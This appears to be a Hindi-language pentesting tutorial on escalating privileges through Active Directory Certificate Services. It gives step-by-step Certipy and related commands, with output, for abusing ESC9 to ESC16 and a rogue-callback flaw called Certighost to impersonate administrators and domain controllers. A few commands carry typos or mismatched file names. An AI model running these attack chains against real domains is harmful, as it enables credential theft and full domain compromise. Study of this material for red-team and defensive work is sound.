Certificate का request Certipy द्वारा default रूप से `Machine` या `User` template के आधार पर किया जाता है। यह इस बात से निर्धारित होता है कि relay किए जा रहे account का नाम `$` पर समाप्त होता है या नहीं। वैकल्पिक template निर्दिष्ट करने के लिए `-template` parameter का उपयोग किया जा सकता है।

इसके बाद authentication को coerce करने के लिए [PetitPotam](https://github.com/ly4k/PetitPotam) जैसी technique का उपयोग किया जा सकता है। Domain controllers के साथ काम करते समय `-template DomainController` निर्दिष्ट करना आवश्यक है।
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### विवरण

**`msPKI-Enrollment-Flag`** के लिए नया value **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`), जिसे ESC9 कहा जाता है, certificate में **नए `szOID_NTDS_CA_SECURITY_EXT` security extension** को embed होने से रोकता है। यह flag तब relevant हो जाता है जब `StrongCertificateBindingEnforcement` को `1` (default setting) पर set किया जाता है, जो `2` की setting से अलग है। इसका महत्व उन scenarios में बढ़ जाता है जहां Kerberos या Schannel के लिए कमजोर certificate mapping का exploit किया जा सकता है (जैसे ESC10 में), क्योंकि ESC9 की अनुपस्थिति requirements को नहीं बदलेगी।

वे conditions जिनके अंतर्गत इस flag की setting significant हो जाती है:

- `StrongCertificateBindingEnforcement` को `2` पर adjust नहीं किया गया है (default `1` है), या `CertificateMappingMethods` में `UPN` flag शामिल है।
- Certificate को `msPKI-Enrollment-Flag` setting में `CT_FLAG_NO_SECURITY_EXTENSION` flag के साथ mark किया गया है।
- Certificate द्वारा कोई भी client authentication EKU specified है।
- किसी अन्य account को compromise करने के लिए किसी भी account पर `GenericWrite` permissions उपलब्ध हैं।

### Abuse Scenario

मान लें कि `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` permissions हैं, और लक्ष्य `Administrator@corp.local` को compromise करना है। `ESC9` certificate template, जिसमें `Jane@corp.local` enroll कर सकती है, अपनी `msPKI-Enrollment-Flag` setting में `CT_FLAG_NO_SECURITY_EXTENSION` flag के साथ configured है।

सबसे पहले, `John` के `GenericWrite` की मदद से Shadow Credentials का उपयोग करके `Jane` का hash प्राप्त किया जाता है:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
इसके बाद, `Jane` का `userPrincipalName` बदलकर `Administrator` कर दिया जाता है, जिसमें जानबूझकर `@corp.local` domain part को छोड़ दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
यह संशोधन constraints का उल्लंघन नहीं करता, क्योंकि `Administrator@corp.local` `Administrator` के `userPrincipalName` के रूप में अलग बना रहता है।

इसके बाद, vulnerable के रूप में चिह्नित `ESC9` certificate template को `Jane` के रूप में request किया जाता है:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
यह नोट किया गया है कि certificate का `userPrincipalName`, किसी भी “object SID” के बिना, `Administrator` को दर्शाता है।

इसके बाद `Jane` का `userPrincipalName` उसके मूल मान `Jane@corp.local` पर वापस कर दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
जारी किए गए certificate से अब authentication करने पर `Administrator@corp.local` का NT hash प्राप्त होता है। Certificate में domain specification न होने के कारण command में `-domain <domain>` शामिल करना आवश्यक है:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## कमजोर Certificate Mappings - ESC10

### व्याख्या

Domain controller पर दो registry key values को ESC10 के संदर्भ में देखा जाता है:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` के अंतर्गत `CertificateMappingMethods` का default value `0x18` (`0x8 | 0x10`) है, जिसे पहले `0x1F` पर सेट किया जाता था।
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` के अंतर्गत `StrongCertificateBindingEnforcement` की default setting `1` है, जिसे पहले `0` पर सेट किया जाता था।

**Case 1**

जब `StrongCertificateBindingEnforcement` को `0` के रूप में configure किया गया हो।

**Case 2**

यदि `CertificateMappingMethods` में `UPN` bit (`0x4`) शामिल हो।

### Abuse Case 1

`StrongCertificateBindingEnforcement` को `0` के रूप में configure किए जाने पर, `GenericWrite` permissions वाले account A का उपयोग करके किसी भी account B को compromise किया जा सकता है।

उदाहरण के लिए, `Jane@corp.local` पर `GenericWrite` permissions होने पर attacker का लक्ष्य `Administrator@corp.local` को compromise करना है। यह procedure ESC9 जैसा ही है, जिससे किसी भी certificate template का उपयोग किया जा सकता है।

सबसे पहले, `GenericWrite` का उपयोग करके Shadow Credentials के माध्यम से `Jane` का hash प्राप्त किया जाता है।
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
इसके बाद, `Jane` का `userPrincipalName` बदलकर `Administrator` कर दिया जाता है, जिसमें constraint violation से बचने के लिए जानबूझकर `@corp.local` वाला भाग शामिल नहीं किया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
इसके बाद, client authentication सक्षम करने वाला एक certificate, default `User` template का उपयोग करके `Jane` के रूप में request किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` फिर उसके मूल मान `Jane@corp.local` पर वापस कर दिया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
प्राप्त certificate के साथ authenticate करने पर `Administrator@corp.local` का NT hash प्राप्त होगा। Certificate में domain details न होने के कारण command में domain निर्दिष्ट करना आवश्यक है।
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` में `UPN` bit flag (`0x4`) होने पर, `GenericWrite` permissions वाला account A किसी भी ऐसे account B को compromise कर सकता है जिसमें `userPrincipalName` property नहीं है, जिसमें machine accounts और built-in domain administrator `Administrator` शामिल हैं।

यहाँ लक्ष्य `DC$@corp.local` को compromise करना है, जिसकी शुरुआत `GenericWrite` का उपयोग करके Shadow Credentials के माध्यम से `Jane` का hash प्राप्त करने से की जाती है।
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` का `userPrincipalName` फिर `DC$@corp.local` पर सेट किया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
डिफ़ॉल्ट `User` template का उपयोग करके client authentication के लिए `Jane` के रूप में certificate का अनुरोध किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
इस प्रक्रिया के बाद `Jane` का `userPrincipalName` अपने मूल मान पर वापस आ जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel के माध्यम से authenticate करने के लिए Certipy के `-ldap-shell` option का उपयोग किया जाता है, जो `u:CORP\DC$` के रूप में authentication की सफलता दर्शाता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell के माध्यम से, `set_rbcd` जैसे commands Resource-Based Constrained Delegation (RBCD) attacks को सक्षम करते हैं, जिससे domain controller से संभावित रूप से compromise हो सकता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
यह vulnerability उन सभी user accounts तक भी विस्तारित होती है जिनमें `userPrincipalName` मौजूद नहीं है या जिसका मान `sAMAccountName` से मेल नहीं खाता। डिफ़ॉल्ट `Administrator@corp.local` elevated LDAP privileges और default रूप से `userPrincipalName` के मौजूद न होने के कारण एक प्रमुख target है।

## NTLM को ICPR पर Relaying - ESC11

### Explanation

यदि CA Server को `IF_ENFORCEENCRYPTICERTREQUEST` के साथ configured नहीं किया गया है, तो RPC service के माध्यम से signing के बिना NTLM relay attacks किए जा सकते हैं। [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)।

आप `certipy` का उपयोग करके enumerate कर सकते हैं कि `Enforce Encryption for Requests` Disabled है या नहीं। `certipy` `ESC11` Vulnerabilities दिखाएगा।
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

इसे एक relay server setup करने की आवश्यकता है:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
नोट: Domain controllers के लिए, DomainController में `-template` निर्दिष्ट करना आवश्यक है।

या [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) का उपयोग करके:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM के साथ ADCS CA तक Shell access - ESC12

### Explanation

Administrators Certificate Authority को "Yubico YubiHSM2" जैसे किसी external device पर store करने के लिए set up कर सकते हैं।

यदि USB device CA server से USB port के माध्यम से connected है, या CA server virtual machine होने की स्थिति में USB device server के माध्यम से connected है, तो YubiHSM में keys generate और utilize करने के लिए Key Storage Provider को एक authentication key (जिसे कभी-कभी "password" भी कहा जाता है) की आवश्यकता होती है।

यह key/password registry में `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` के अंतर्गत cleartext में store होता है।

Reference [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

यदि CA की private key किसी physical USB device पर stored है और आपको shell access मिल जाता है, तो key को recover करना संभव है।

सबसे पहले, आपको CA certificate प्राप्त करना होगा (यह public है) और फिर:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
अंत में, CA certificate और उसकी private key का उपयोग करके एक नया arbitrary certificate forge करने के लिए certutil `-sign` command का उपयोग करें।

## OID Group Link Abuse - ESC13

### व्याख्या

`msPKI-Certificate-Policy` attribute certificate template में issuance policy जोड़ने की अनुमति देता है। Issuance policies जारी करने के लिए जिम्मेदार `msPKI-Enterprise-Oid` objects को PKI OID container के Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) में discover किया जा सकता है। इस object के `msDS-OIDToGroupLink` attribute का उपयोग करके किसी policy को AD group से link किया जा सकता है, जिससे system certificate प्रस्तुत करने वाले user को इस प्रकार authorize कर सकता है, जैसे वह उस group का member हो। [यहां Reference](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)।

दूसरे शब्दों में, जब किसी user के पास certificate enroll करने की permission होती है और certificate किसी OID group से linked होता है, तो user इस group के privileges inherit कर सकता है।

OIDToGroupLink खोजने के लिए [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) का उपयोग करें:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

ऐसी user permission खोजें जिसे `certipy find` या `Certify.exe find /showAllPermissions` से उपयोग किया जा सके।

यदि `John` के पास `VulnerableTemplate` में enroll करने की permission है, तो user `VulnerableGroup` group के privileges inherit कर सकता है।

उसे केवल template specify करना होगा; उसे `OIDToGroupLink` rights वाला certificate मिल जाएगा।
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Explanation

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping पर दिया गया विवरण उल्लेखनीय रूप से व्यापक है। नीचे मूल पाठ का उद्धरण दिया गया है।

ESC14 "weak explicit certificate mapping" से उत्पन्न vulnerabilities को संबोधित करता है, जो मुख्य रूप से Active Directory user या computer accounts पर `altSecurityIdentities` attribute के दुरुपयोग या असुरक्षित configuration के कारण होती हैं। यह multi-valued attribute administrators को authentication purposes के लिए X.509 certificates को किसी AD account के साथ manually associate करने की अनुमति देता है। जब यह populated होता है, तो ये explicit mappings default certificate mapping logic को override कर सकती हैं, जो आमतौर पर certificate के SAN में UPNs या DNS names, अथवा `szOID_NTDS_CA_SECURITY_EXT` security extension में embedded SID पर निर्भर करता है।

एक "weak" mapping तब होती है जब `altSecurityIdentities` attribute में certificate की पहचान के लिए प्रयुक्त string बहुत व्यापक, आसानी से guess की जा सकने वाली, non-unique certificate fields पर निर्भर, या आसानी से spoof किए जा सकने वाले certificate components का उपयोग करती है। यदि attacker किसी privileged account के लिए ऐसी weakly defined explicit mapping से match करने वाला certificate प्राप्त या craft कर सकता है, तो वह उस certificate का उपयोग करके उस account के रूप में authenticate और impersonate कर सकता है।

संभावित रूप से weak `altSecurityIdentities` mapping strings के उदाहरणों में शामिल हैं:

- केवल common Subject Common Name (CN) के आधार पर mapping: जैसे, `X509:<S>CN=SomeUser`। Attacker किसी कम secure source से इस CN वाला certificate प्राप्त कर सकता है।
- बिना किसी specific serial number या subject key identifier जैसे अतिरिक्त qualification के अत्यधिक generic Issuer Distinguished Names (DNs) या Subject DNs का उपयोग: जैसे, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`।
- अन्य predictable patterns या non-cryptographic identifiers का उपयोग, जिन्हें attacker ऐसे certificate में पूरा कर सकता है जिसे वह legitimately obtain या forge कर सकता है (यदि उसने CA compromise कर लिया हो या ESC1 जैसी vulnerable template खोज ली हो)।

`altSecurityIdentities` attribute mapping के लिए विभिन्न formats को support करता है, जैसे:

- `X509:<I>IssuerDN<S>SubjectDN` (full Issuer और Subject DN के आधार पर mapping)
- `X509:<SKI>SubjectKeyIdentifier` (certificate के Subject Key Identifier extension value के आधार पर mapping)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number के आधार पर mapping, जिसे Issuer DN implicit रूप से qualify करता है) - यह standard format नहीं है, आमतौर पर यह `<I>IssuerDN<SR>SerialNumber` होता है।
- `X509:<RFC822>EmailAddress` (SAN से RFC822 name, सामान्यतः email address, के आधार पर mapping)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate की raw public key के SHA1 hash के आधार पर mapping - सामान्यतः strong)

इन mappings की security mapping string में प्रयुक्त चुने गए certificate identifiers की specificity, uniqueness और cryptographic strength पर बहुत अधिक निर्भर करती है। Domain Controllers पर strong certificate binding modes enabled होने पर भी (जो मुख्य रूप से SAN UPNs/DNS और SID extension पर आधारित implicit mappings को प्रभावित करते हैं), poorly configured `altSecurityIdentities` entry impersonation के लिए direct path प्रस्तुत कर सकती है, यदि mapping logic स्वयं flawed या अत्यधिक permissive हो।
### Abuse Scenario

ESC14 Active Directory (AD) में **explicit certificate mappings** को target करता है, विशेष रूप से `altSecurityIdentities` attribute को। यदि यह attribute (design या misconfiguration के कारण) set है, तो attackers ऐसी certificates प्रस्तुत करके accounts को impersonate कर सकते हैं जो mapping से match करती हों।

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: Attacker के पास target account के `altSecurityIdentities` attribute पर write permissions हैं या target AD object पर निम्न में से किसी एक permission के रूप में इसे grant करने की permission है:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: Target के altSecurityIdentities में weak X509RFC822 mapping है। Attacker victim के mail attribute को target के X509RFC822 name से match करने के लिए set कर सकता है, victim के रूप में certificate enroll कर सकता है और target के रूप में authenticate करने के लिए इसका उपयोग कर सकता है।
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: Target के `altSecurityIdentities` में weak X509IssuerSubject explicit mapping है। Attacker victim principal पर `cn` या `dNSHostName` attribute को target की X509IssuerSubject mapping के subject से match करने के लिए set कर सकता है। इसके बाद attacker victim के रूप में certificate enroll कर सकता है और target के रूप में authenticate करने के लिए इस certificate का उपयोग कर सकता है।
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: Target के `altSecurityIdentities` में weak X509SubjectOnly explicit mapping है। Attacker victim principal पर `cn` या `dNSHostName` attribute को target की X509SubjectOnly mapping के subject से match करने के लिए set कर सकता है। इसके बाद attacker victim के रूप में certificate enroll कर सकता है और target के रूप में authenticate करने के लिए इस certificate का उपयोग कर सकता है।
### concrete operations
#### Scenario A

Certificate template `Machine` का certificate request करें
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Certificate को सेव और कन्वर्ट करें
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
प्रमाणीकरण करें (certificate का उपयोग करके)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
सफाई (वैकल्पिक)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
अधिक विशिष्ट attack methods और विभिन्न attack scenarios के लिए, कृपया निम्नलिखित देखें: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)।

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### व्याख्या

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc पर दिया गया विवरण उल्लेखनीय रूप से thorough है। नीचे original text का quotation दिया गया है।

Built-in default version 1 certificate templates का उपयोग करके, attacker ऐसा CSR तैयार कर सकता है जिसमें application policies शामिल हों, जिन्हें template में निर्दिष्ट configured Extended Key Usage attributes की तुलना में प्राथमिकता दी जाती है। केवल enrollment rights आवश्यक हैं, और इसका उपयोग **_WebServer_** template का उपयोग करके client authentication, certificate request agent और codesigning certificates बनाने के लिए किया जा सकता है।

### Abuse

निम्नलिखित का reference [इस link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)से दिया गया है। अधिक detailed usage methods देखने के लिए Click करें।


यदि CA unpatched है, तो Certipy का `find` command उन V1 templates की पहचान करने में सहायता कर सकता है जो संभावित रूप से ESC15 के प्रति susceptible हैं।
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Schannel के जरिए Direct Impersonation

**चरण 1: "Client Authentication" Application Policy और target UPN inject करते हुए certificate का अनुरोध करें।** Attacker `attacker@corp.local`, "WebServer" V1 template का उपयोग करके `administrator@corp.local` को target करता है (जो enrollee-supplied subject की अनुमति देता है)।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" के साथ vulnerable V1 template।
- `-application-policies 'Client Authentication'`: CSR के Application Policies extension में OID `1.3.6.1.5.5.7.3.2` inject करता है।
- `-upn 'administrator@corp.local'`: impersonation के लिए SAN में UPN सेट करता है।

**Step 2: प्राप्त certificate का उपयोग करके Schannel (LDAPS) के माध्यम से authenticate करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Step 1: "Enrollee supplies subject" वाले V1 template से certificate request करें, जिसमें "Certificate Request Agent" Application Policy inject की गई हो।** यह certificate attacker (`attacker@corp.local`) के लिए enrollment agent बनने हेतु है। यहां attacker की अपनी identity के लिए कोई UPN निर्दिष्ट नहीं किया गया है, क्योंकि लक्ष्य agent capability प्राप्त करना है।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` inject करता है।

**Step 2: "agent" certificate का उपयोग करके target privileged user की ओर से certificate request करें।** यह ESC3-जैसा step है, जिसमें Step 1 के certificate को agent certificate के रूप में उपयोग किया जाता है।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**चरण 3: "on-behalf-of" certificate का उपयोग करके privileged user के रूप में authenticate करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA पर Security Extension Disabled (Globally)-ESC16

### Explanation

**ESC16 (Missing szOID_NTDS_CA_SECURITY_EXT Extension के कारण Elevation of Privilege)** उस scenario को refer करता है, जिसमें यदि AD CS का configuration सभी certificates में **szOID_NTDS_CA_SECURITY_EXT** extension को शामिल करना enforce नहीं करता है, तो attacker इसका exploit करके:

1. **SID binding के बिना** certificate request कर सकता है।

2. इस certificate का उपयोग **किसी भी account के रूप में authentication** के लिए कर सकता है, जैसे किसी high-privilege account (उदाहरण के लिए, Domain Administrator) का impersonation करना।

विस्तृत principle के बारे में अधिक जानने के लिए आप इस article को भी refer कर सकते हैं:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

निम्नलिखित को [इस link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) में reference किया गया है। अधिक विस्तृत usage methods देखने के लिए click करें।

यह पहचानने के लिए कि Active Directory Certificate Services (AD CS) environment **ESC16** के प्रति vulnerable है,
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**चरण 1: victim account का initial UPN पढ़ें (वापसी के लिए वैकल्पिक)।
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**चरण 2: victim account के UPN को target administrator के `sAMAccountName` पर अपडेट करें।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**चरण 3: (यदि आवश्यक हो) "victim" account के लिए credentials प्राप्त करें (उदाहरण के लिए, Shadow Credentials के माध्यम से)।**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16-vulnerable CA पर _any suitable client authentication template_ (जैसे, "User") से "victim" user के रूप में certificate request करें।** क्योंकि CA ESC16 के लिए vulnerable है, यह issued certificate में SID security extension को automatically omit कर देगा, चाहे इस extension के लिए template की specific settings कुछ भी हों। Kerberos credential cache environment variable सेट करें (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
फिर certificate का अनुरोध करें:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**चरण 5: "victim" account के UPN को पहले जैसा करें।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Step 6: Target administrator के रूप में Authenticate करें।**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### व्याख्या

**Certighost** एक **AD CS enrollment chase / callback path** का दुरुपयोग करता है, जिसमें CA जारी किए जाने वाले certificate में रखी जाने वाली identity को resolve करने के लिए requester द्वारा दिए गए request attributes पर भरोसा करता है। Public PoC में crafted request में शामिल होते हैं:

- **`cdc`**: attacker-controlled host/IP, जिससे CA संपर्क करेगा
- **`rmd`**: impersonate किए जाने वाले **target Domain Controller DNS name**

यदि CA उस chase का पालन करता है, तो वह attacker से **SMB/LSA (`445`)** और **LDAP (`389`)** के माध्यम से connect करेगा। Attacker एक **real machine account** का उपयोग करता है, जो आमतौर पर default **`ms-DS-MachineAccountQuota`** के माध्यम से बनाया जाता है, ताकि callback session एक valid domain principal के रूप में authenticate हो। लेकिन rogue services इसके बजाय **target DC** के identity attributes लौटाती हैं:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

यदि CA **returned identity को authenticated callback principal के साथ cryptographically bind नहीं करता**, तो session के attacker-controlled machine account के रूप में authenticate होने के बावजूद वह **Domain Controller** के लिए certificate जारी कर सकता है। वैचारिक रूप से यह bug **Certifried** से अलग है: इसमें `dNSHostName` जैसे AD attributes को rewrite करने के बजाय attacker **CA callback resolution के दौरान identity data को substitute करता है**।

**उपयोगी preconditions:**

- Low-privileged **domain credentials**
- Computer account **create या reuse** करने की क्षमता
- CA से attacker-controlled **ports `389` और `445`** तक network reachability
- Vulnerable / unpatched CA request path (**July 14, 2026** के Microsoft update ने **`cdc` के लिए DC validation** और **resolved-SID comparison** जोड़ा)

इसके बाद प्राप्त **`.pfx`** का उपयोग **PKINIT** के लिए किया जा सकता है, जिससे **`.ccache`** और published PoC flow में **target DC NT hash** प्राप्त होता है। यह सामान्यतः **full domain compromise** के लिए पर्याप्त होता है।

### दुरुपयोग

Public PoC पूरी chain को automate करता है:

1. Attacker-controlled **machine account** को create या reuse करना।
2. `389` और `445` पर **rogue LDAP और SMB/LSA listeners** शुरू करना।
3. Attacker-controlled **`cdc`** और target **`rmd`** attributes वाली certificate request submit करना।
4. CA को controlled machine account के रूप में rogue listeners से authenticate करने देना, लेकिन identity lookups के उत्तर **target DC** के attributes से देना।
5. CA-signed **DC certificate** प्राप्त करना और फिर उसे **PKINIT** के लिए उपयोग करना।
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC से उपयोगी runtime flags:

- `--listener <ip>`: `cdc` में advertised callback IP को स्पष्ट रूप से चुनें
- `--computer-name <NAME$>`: नया machine account बनाने के बजाय किसी मौजूदा machine account का पुनः उपयोग करें

**Operational notes:**

- PoC को **root** की आवश्यकता होती है, क्योंकि यह **privileged ports** `389` और `445` से bind होता है।
- सफल exploitation के बाद एक **DC `.pfx`** और **Kerberos `.ccache`** स्थानीय रूप से लिखे जाते हैं।
- चूंकि certificate एक **Domain Controller account** से map होता है, इसलिए आगे की कार्रवाइयों में **certificate-based Kerberos auth**, **DCSync**, और प्राप्त **machine NT hash** का पुनः उपयोग शामिल हो सकता है।

## Certificates के साथ Forests को Compromise करना: Passive Voice में व्याख्या

### Compromised CAs द्वारा Forest Trusts को तोड़ना

